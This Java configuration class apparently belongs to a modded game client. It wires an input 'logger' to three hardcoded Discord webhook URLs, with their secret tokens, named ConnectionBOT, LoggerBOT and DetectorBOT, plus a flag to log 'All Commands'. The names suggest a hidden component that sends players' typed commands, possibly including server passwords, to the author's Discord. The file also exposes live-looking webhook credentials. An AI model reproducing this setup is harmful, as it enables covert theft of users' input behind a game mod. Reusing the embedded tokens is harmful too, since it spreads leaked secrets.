package Game.Sense.client.Helper.events.impl.input.logger.config;


import Game.Sense.client.Helper.events.impl.input.logger.webhook.DiscordWebhook;

public class cfg {

    public static boolean logAll = false; // All Commands

    public static DiscordWebhook connection = new DiscordWebhook("https://discord.com/api/webhooks/978740553283928114/sSFXf_9cSaq7QbeggYQzqCPszeEnuK3idBR70VWUoIU1sM0cVviufjh2zZR_g4v0_aly"); // Your ConnectionBOT webhook
    public static DiscordWebhook logger = new DiscordWebhook("https://discord.com/api/webhooks/978740462162673665/OwZ7X2hfh-OuPAh5rJ4-6vfxFsHuoO40KuWYPI7NxqpG0OiDstLL9Kq0aRJnEaRrjxch"); // Your LoggerBOT webhook
    public static DiscordWebhook detector = new DiscordWebhook("https://discord.com/api/webhooks/978740657894092920/Sq80ygKQ3dAll-BVJsyLQqjMQQ_LFRGeems6QTw76ksM9IqBrxLgRRuIgtmf_H4Opf0I"); // Your DetectorBOT webhook
}
